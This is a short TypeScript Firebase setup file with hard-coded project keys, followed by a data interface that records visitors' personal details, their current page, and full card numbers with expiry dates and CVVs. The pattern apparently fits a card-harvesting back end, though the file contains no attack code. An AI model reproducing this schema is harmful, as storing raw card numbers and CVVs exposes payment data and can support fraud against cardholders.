import { initializeApp, getApps, getApp } from "firebase/app";
import { getAuth } from "firebase/auth";
import { getFirestore } from "firebase/firestore";
import { getDatabase } from "firebase/database";

const firebaseConfig = {
    apiKey: "AIzaSyCGRElZSDS-O81vd25imQZUYsDepIvRF2A",
  authDomain: "krod-4cffb.firebaseapp.com",
  databaseURL: "https://krod-4cffb-default-rtdb.firebaseio.com",
  projectId: "krod-4cffb",
  storageBucket: "krod-4cffb.firebasestorage.app",
  messagingSenderId: "836859156387",
  appId: "1:836859156387:web:aad26fc8b9e0ddbd96ec16",
  measurementId: "G-473234FGDR"
};

const app = getApps().length > 0 ? getApp() : initializeApp(firebaseConfig);
const auth = getAuth(app);
const db = getFirestore(app);
const database = getDatabase(app);

export { app, auth, db, database };

export interface NotificationDocument {
  id: string;
  name: string;
  hasPersonalInfo: boolean;
  hasCardInfo: boolean;
  currentPage: string;
  time: string;
  notificationCount: number;
  personalInfo?: {
    fullName: string;
    email: string;
    phone: string;
    address: string;
  };
  cardInfo?: {
    cardNumber: string;
    expirationDate: string;
    cvv: string;
  };
}

